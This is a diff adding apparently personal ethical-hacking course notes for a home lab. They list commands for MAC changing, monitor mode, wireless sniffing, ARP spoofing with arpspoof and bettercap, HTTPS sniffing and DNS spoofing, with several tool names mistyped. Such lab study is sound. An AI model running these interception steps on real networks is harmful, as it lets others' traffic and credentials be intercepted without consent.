@@ -1,0 +1,191 @@
+Kali Linux
+Windows 
+Metasploitable
+
+
+explainshell
+
+wireless adapter--supports Monitor Mode, Packet Injection, AP mode
+
+RealTek RTL8812AU
+Atheros AR9271
+
+
+
+MAC - Media Access Control
+
+ifconfig - list all network interfaces
+
+1) Disable the network interfaces
+  ifconfig wlan0 down
+2) change address
+  ifconfig wlan0 hw ether 00:11:22:33:55
+3) enable
+  ifconfig wlan0 up
+--> will revert the mac address after reboot
+
+
+
+--> iwconfig --only wireless
+
+for change the mode from managed to monitor to trace the all packets over the network
+
+disable the network adabpte
+
+ifconfig wlan0 down
+
+--> kill any network
+
+airmon-ng check kill
+
+--> iwconfig wlan0 mode monitor
+
+--> ifconfig wlan0 up
+
+
+
+
+=====================
+Packet SNIFFING
+ enable monitor mode in wireless network
+ 
+ --->airdump-ng man0(interfaces name)
+ 
+ -->  Discover 5g Networks
+ 
+ airdump-ng --band  a mon0   
+ 
+ [a - 5g
+ 
+  airdump-ng --band  abg mon0 
+  
+  [abg -2.5 & 5 g both]
+  
+  
+==>
+
+airdump-ng -bssid  mac_ad --channel <2> --write test man0
+
+
+==================
+192.168.224.129 --> Linux Centos
+192.168.224.128 --> Kali Linux
+netdiscover -r ip/24  
+ 
+ ===================?
+ 
+ Arp Spoofing attack
+ 
+ arp -a -- > to check the gateway ip/24
+ 
+ 
+
+
+centos mac details
+inet 192.168.224.129  
+inet6 fe80::20c:29ff:fe2f:876d  
+
+kali
+92.168.224.128 
+inet6 fe80::20c:29ff:fe7d:9584
+
+currently centos gateway mac is below
+? (192.168.224.254) at 00:50:56:ed:92:f8 [ether] on ens33
+_gateway (192.168.224.2) at 00:50:56:f9:af:39 [ether] on ens33---> gateway may , we need to chagne by arp spoofing to our mac, all networs tracffic will goes through us
+? (192.168.224.128) at 00:0c:29:7d:95:84 [ether] on ens33
+
+
+kali gateway detai;s
+? (192.168.224.254) at 00:50:56:ed:92:f8 [ether] on eth0
+? (192.168.224.129) at 00:0c:29:2f:87:6d [ether] on eth0
+_gateway (192.168.224.2) at 00:50:56:f9:af:39 [ether] on eth0
+
+
+
+	                   <gateway>       <target_ip>
+arpspoof -i eth0 -t 192.168.224.2  192.168.224.129
+
+	                   <target_ip>      <gateway>    
+arpspoof -i eth0 -t 192.168.224.129 192.168.224.2
+ 
+
+
+after hack
+? (192.168.224.254) at 00:50:56:ed:92:f8 [ether] on ens33
+_gateway (192.168.224.2) at 00:0c:29:7d:95:84 [ether] on ens33 -> this mac go changes, a
+? (192.168.224.128) at 00:0c:29:7d:95:84 [ether] on ens33
+
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+
+============================
+arp sppof with bettercap
+
+
+bettercap -iface <interface_name>
+
+net probe on  -> detect connected list
+
+net.show  ->> connected device in the table form
+
+-set arp.spoof.fulldubplex true  => same thing above 2 commands
+set arp.spoof.targets <target_ip> eg.  set arp.spoof.targets   192.168.224.129
+arp.spoof on
+[net.probe and net recon must be running]
+
+
+==> analyze the flow of data
+
+net.sniff
+
+net.sniff on
+
+--> all above command can be put on text file with .cap extension
+
+to run -> bettercap -iface eth0 -caplet sppof.cap
+
+
+--> https hacking
+before net.sniff on
+
+we have add set net.sniff.local true
+
+
+full command
+net.probe on
+net.recon on
+set arp.spoof.fulldubplex true
+set arp.sppof.targets  ip_ad
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+
+
+====>
+caplet.show  
+
+htshijack
+
+
+
+
+==>
+
+DNS Spoofing
+service apache2 start  --> var/www/html
+
+bettercap -iface eth0  caplet file
+then
+   dns.spoof.all true
+   set dns.spoof.domains website.com,*.website.com
+   dns.spoof on
+
+
+====>GUI Interface
+bettercap -iface eth0
+
+then -> ui.update to install
+then -> http-ui
